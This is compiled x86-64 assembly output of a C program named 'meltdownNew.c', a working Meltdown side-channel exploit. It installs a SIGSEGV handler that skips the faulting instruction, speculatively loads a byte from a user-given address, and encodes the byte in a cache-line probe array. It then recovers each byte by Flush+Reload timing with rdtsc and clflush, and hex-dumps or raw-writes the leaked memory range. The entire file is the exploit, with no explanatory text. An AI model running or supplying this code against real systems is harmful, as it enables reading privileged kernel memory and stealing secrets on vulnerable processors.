	.file	"meltdownNew.c"
	.text
	.type	sigaction_segv, @function
sigaction_segv:
.LFB9:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movl	%edi, -20(%rbp)
	movq	%rsi, -32(%rbp)
	movq	%rdx, -40(%rbp)
	movq	-40(%rbp), %rax
	movq	%rax, -8(%rbp)
	leaq	__speculative_byte_load_exit(%rip), %rdx
	movq	-8(%rbp), %rax
	movq	%rdx, 168(%rax)
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE9:
	.size	sigaction_segv, .-sigaction_segv
	.globl	probe_one
	.type	probe_one, @function
probe_one:
.LFB12:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%rbx
	subq	$2424, %rsp
	.cfi_offset 3, -24
	movq	%rdi, -2408(%rbp)
	movq	%rsi, -2416(%rbp)
	movl	%edx, -2420(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -24(%rbp)
	xorl	%eax, %eax
	movl	$5, -2376(%rbp)
	movl	$0, -2372(%rbp)
	movl	$0, -2384(%rbp)
	movl	$0, -2380(%rbp)
	movb	$0, -2393(%rbp)
	movq	$0, -2360(%rbp)
	leaq	-288(%rbp), %rax
	movl	$256, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset@PLT
	movl	$0, -2392(%rbp)
	jmp	.L3
.L13:
	leaq	-2336(%rbp), %rax
	movl	$2048, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset@PLT
	movl	$0, -2388(%rbp)
	jmp	.L4
.L5:
	movl	-2388(%rbp), %eax
	imull	-2420(%rbp), %eax
	movslq	%eax, %rdx
	movq	-2416(%rbp), %rax
	addq	%rdx, %rax
	movq	%rax, -2352(%rbp)
	movq	-2352(%rbp), %rax
#APP
# 104 "meltdownNew.c" 1
	mfence         
clflush 0(%rax)  

# 0 "" 2
#NO_APP
	nop
	addl	$1, -2388(%rbp)
.L4:
	cmpl	$255, -2388(%rbp)
	jle	.L5
	movl	$0, %edx
	movl	$0, %esi
	movl	$-1, %edi
	call	read@PLT
	movq	-2408(%rbp), %rdx
	movq	-2416(%rbp), %rcx
#APP
# 156 "meltdownNew.c" 1
	.global __speculative_byte_load_exit 
	92:                              
xorq %rax, %rax                
movb (%rdx), %al              
shlq $0xc, %rax                 
jz 92b                           
movq (%rcx, %rax, 1), %rbx   
__speculative_byte_load_exit:     
nop                               

# 0 "" 2
#NO_APP
	movl	$0, -2388(%rbp)
	jmp	.L6
.L8:
	movl	-2388(%rbp), %eax
	imull	-2420(%rbp), %eax
	movslq	%eax, %rdx
	movq	-2416(%rbp), %rax
	addq	%rdx, %rax
	movq	%rax, -2344(%rbp)
	movq	-2344(%rbp), %rax
	movq	%rax, %rcx
#APP
# 118 "meltdownNew.c" 1
	mfence             
lfence             
rdtsc              
lfence             
movl %eax, %esi  
movl (%rcx), %eax   
lfence             
rdtsc              
subl %esi, %eax  
clflush 0(%rcx)      

# 0 "" 2
#NO_APP
	movq	%rax, -2368(%rbp)
	movq	-2368(%rbp), %rdx
	movl	-2388(%rbp), %eax
	cltq
	movq	%rdx, -2336(%rbp,%rax,8)
	addl	$1, -2388(%rbp)
.L6:
	cmpl	$255, -2388(%rbp)
	jle	.L8
	movl	$0, -2388(%rbp)
	jmp	.L9
.L12:
	movl	-2384(%rbp), %eax
	cltq
	movq	-2336(%rbp,%rax,8), %rax
	movl	-2388(%rbp), %edx
	movslq	%edx, %rdx
	movq	-2336(%rbp,%rdx,8), %rdx
	cmpq	%rax, %rdx
	jnb	.L10
	movl	-2388(%rbp), %eax
	jmp	.L11
.L10:
	movl	-2384(%rbp), %eax
.L11:
	movl	%eax, -2384(%rbp)
	addl	$1, -2388(%rbp)
.L9:
	cmpl	$255, -2388(%rbp)
	jle	.L12
	movl	-2384(%rbp), %eax
	cltq
	movzbl	-288(%rbp,%rax), %eax
	leal	1(%rax), %edx
	movl	-2384(%rbp), %eax
	cltq
	movb	%dl, -288(%rbp,%rax)
	addl	$1, -2392(%rbp)
.L3:
	movl	-2392(%rbp), %eax
	cmpl	-2376(%rbp), %eax
	jl	.L13
	movl	$0, -2388(%rbp)
	jmp	.L14
.L17:
	movl	-2388(%rbp), %eax
	cltq
	movzbl	-288(%rbp,%rax), %edx
	movl	-2380(%rbp), %eax
	cltq
	movzbl	-288(%rbp,%rax), %eax
	cmpb	%dl, %al
	jnb	.L15
	movl	-2388(%rbp), %eax
	jmp	.L16
.L15:
	movl	-2380(%rbp), %eax
.L16:
	movl	%eax, -2380(%rbp)
	addl	$1, -2388(%rbp)
.L14:
	cmpl	$255, -2388(%rbp)
	jle	.L17
	movl	-2380(%rbp), %eax
	movq	-24(%rbp), %rdx
	subq	%fs:40, %rdx
	je	.L19
	call	__stack_chk_fail@PLT
.L19:
	movq	-8(%rbp), %rbx
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE12:
	.size	probe_one, .-probe_one
	.section	.rodata
.LC0:
	.string	"0x%016lx | "
.LC1:
	.string	"%02X "
.LC2:
	.string	"|  %s \n"
.LC3:
	.string	"   "
	.text
	.globl	dump_hex
	.type	dump_hex, @function
dump_hex:
.LFB13:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$80, %rsp
	movq	%rdi, -56(%rbp)
	movq	%rsi, -64(%rbp)
	movq	%rdx, -72(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movb	$0, -16(%rbp)
	movq	-56(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC0(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	$0, -48(%rbp)
	jmp	.L21
.L30:
	movq	-64(%rbp), %rdx
	movq	-48(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	movzbl	%al, %eax
	movl	%eax, %esi
	leaq	.LC1(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	-64(%rbp), %rdx
	movq	-48(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	cmpb	$31, %al
	jbe	.L22
	movq	-64(%rbp), %rdx
	movq	-48(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	cmpb	$126, %al
	ja	.L22
	movq	-64(%rbp), %rdx
	movq	-48(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %edx
	movq	-48(%rbp), %rax
	andl	$15, %eax
	movb	%dl, -32(%rbp,%rax)
	jmp	.L23
.L22:
	movq	-48(%rbp), %rax
	andl	$15, %eax
	movb	$46, -32(%rbp,%rax)
.L23:
	movq	-48(%rbp), %rax
	addq	$1, %rax
	andl	$7, %eax
	testq	%rax, %rax
	je	.L24
	movq	-48(%rbp), %rax
	addq	$1, %rax
	cmpq	%rax, -72(%rbp)
	jne	.L25
.L24:
	movl	$32, %edi
	call	putchar@PLT
	movq	-48(%rbp), %rax
	addq	$1, %rax
	andl	$15, %eax
	testq	%rax, %rax
	jne	.L26
	leaq	-32(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC2(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	jmp	.L25
.L26:
	movq	-48(%rbp), %rax
	addq	$1, %rax
	cmpq	%rax, -72(%rbp)
	jne	.L25
	movq	-48(%rbp), %rax
	addq	$1, %rax
	andl	$15, %eax
	movb	$0, -32(%rbp,%rax)
	movq	-48(%rbp), %rax
	addq	$1, %rax
	andl	$15, %eax
	cmpq	$8, %rax
	ja	.L27
	movl	$32, %edi
	call	putchar@PLT
.L27:
	movq	-48(%rbp), %rax
	addq	$1, %rax
	andl	$15, %eax
	movq	%rax, -40(%rbp)
	jmp	.L28
.L29:
	leaq	.LC3(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	addq	$1, -40(%rbp)
.L28:
	cmpq	$15, -40(%rbp)
	jbe	.L29
	leaq	-32(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC2(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
.L25:
	addq	$1, -48(%rbp)
.L21:
	movq	-48(%rbp), %rax
	cmpq	-72(%rbp), %rax
	jb	.L30
	nop
	movq	-8(%rbp), %rax
	subq	%fs:40, %rax
	je	.L31
	call	__stack_chk_fail@PLT
.L31:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE13:
	.size	dump_hex, .-dump_hex
	.section	.rodata
	.align 8
.LC4:
	.string	"usage: %s [start_addr (hex)] [len (dec)] [raw, optional]\n"
.LC5:
	.string	"mmap() failed: %s\n"
	.align 8
.LC6:
	.string	"poke buffer: %p, page size: %i\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB14:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%rbx
	subq	$264, %rsp
	.cfi_offset 3, -24
	movl	%edi, -260(%rbp)
	movq	%rsi, -272(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -24(%rbp)
	xorl	%eax, %eax
	call	getpagesize@PLT
	movl	%eax, -244(%rbp)
	movl	$0, -248(%rbp)
	movq	$0, -232(%rbp)
	movq	$0, -224(%rbp)
	leaq	-208(%rbp), %rax
	movl	$152, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset@PLT
	leaq	-208(%rbp), %rax
	addq	$8, %rax
	movq	%rax, %rdi
	call	sigemptyset@PLT
	leaq	sigaction_segv(%rip), %rax
	movq	%rax, -208(%rbp)
	movl	$4, -72(%rbp)
	leaq	-208(%rbp), %rax
	movl	$0, %edx
	movq	%rax, %rsi
	movl	$11, %edi
	call	sigaction@PLT
	cmpl	$2, -260(%rbp)
	jle	.L33
	cmpl	$4, -260(%rbp)
	jle	.L34
.L33:
	movq	-272(%rbp), %rax
	movq	(%rax), %rax
	movq	%rax, %rsi
	leaq	.LC4(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$0, %eax
	jmp	.L47
.L34:
	movq	-272(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	movl	$16, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	strtoul@PLT
	movq	%rax, -232(%rbp)
	movq	-272(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	movl	$10, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	strtoul@PLT
	movq	%rax, -224(%rbp)
	cmpl	$4, -260(%rbp)
	jne	.L36
	movl	$1, -248(%rbp)
.L36:
	movl	-244(%rbp), %eax
	sall	$8, %eax
	cltq
	movl	$0, %r9d
	movl	$-1, %r8d
	movl	$33, %ecx
	movl	$3, %edx
	movq	%rax, %rsi
	movl	$0, %edi
	call	mmap@PLT
	movq	%rax, -216(%rbp)
	cmpq	$-1, -216(%rbp)
	jne	.L37
	call	__errno_location@PLT
	movl	(%rax), %eax
	movl	%eax, %edi
	call	strerror@PLT
	movq	%rax, %rsi
	leaq	.LC5(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$-1, %eax
	jmp	.L47
.L37:
	movl	-244(%rbp), %edx
	movq	-216(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC6(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	$0, -240(%rbp)
	jmp	.L38
.L41:
	cmpl	$0, -248(%rbp)
	jne	.L39
	cmpq	$0, -240(%rbp)
	je	.L39
	movq	-240(%rbp), %rax
	andl	$15, %eax
	testq	%rax, %rax
	jne	.L39
	movq	-232(%rbp), %rdx
	movq	-240(%rbp), %rax
	addq	%rdx, %rax
	subq	$16, %rax
	movq	%rax, %rcx
	leaq	-48(%rbp), %rax
	movl	$16, %edx
	movq	%rax, %rsi
	movq	%rcx, %rdi
	call	dump_hex
.L39:
	movq	-232(%rbp), %rdx
	movq	-240(%rbp), %rax
	leaq	(%rdx,%rax), %rcx
	movq	-240(%rbp), %rax
	andl	$15, %eax
	movq	%rax, %rbx
	movl	-244(%rbp), %edx
	movq	-216(%rbp), %rax
	movq	%rax, %rsi
	movq	%rcx, %rdi
	call	probe_one
	movb	%al, -48(%rbp,%rbx)
	cmpl	$0, -248(%rbp)
	je	.L40
	movq	-240(%rbp), %rax
	andl	$15, %eax
	movq	%rax, %rdx
	leaq	-48(%rbp), %rax
	addq	%rdx, %rax
	movl	$1, %edx
	movq	%rax, %rsi
	movl	$1, %edi
	call	write@PLT
.L40:
	addq	$1, -240(%rbp)
.L38:
	movq	-240(%rbp), %rax
	cmpq	-224(%rbp), %rax
	jb	.L41
	cmpl	$0, -248(%rbp)
	jne	.L42
	cmpq	$0, -240(%rbp)
	je	.L42
	movq	-240(%rbp), %rax
	andl	$15, %eax
	testq	%rax, %rax
	je	.L43
	movq	-240(%rbp), %rax
	andl	$15, %eax
	movq	%rax, %rdx
	jmp	.L44
.L43:
	movl	$16, %edx
.L44:
	movq	-240(%rbp), %rax
	andl	$15, %eax
	testq	%rax, %rax
	jne	.L45
	movq	-240(%rbp), %rax
	subq	$1, %rax
	andq	$-16, %rax
	jmp	.L46
.L45:
	movq	-240(%rbp), %rax
	andq	$-16, %rax
.L46:
	movq	-232(%rbp), %rcx
	addq	%rcx, %rax
	movq	%rax, %rcx
	leaq	-48(%rbp), %rax
	movq	%rax, %rsi
	movq	%rcx, %rdi
	call	dump_hex
.L42:
	movl	-244(%rbp), %eax
	sall	$8, %eax
	movslq	%eax, %rdx
	movq	-216(%rbp), %rax
	movq	%rdx, %rsi
	movq	%rax, %rdi
	call	munmap@PLT
	movl	$0, %eax
.L47:
	movq	-24(%rbp), %rdx
	subq	%fs:40, %rdx
	je	.L48
	call	__stack_chk_fail@PLT
.L48:
	movq	-8(%rbp), %rbx
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE14:
	.size	main, .-main
	.ident	"GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:
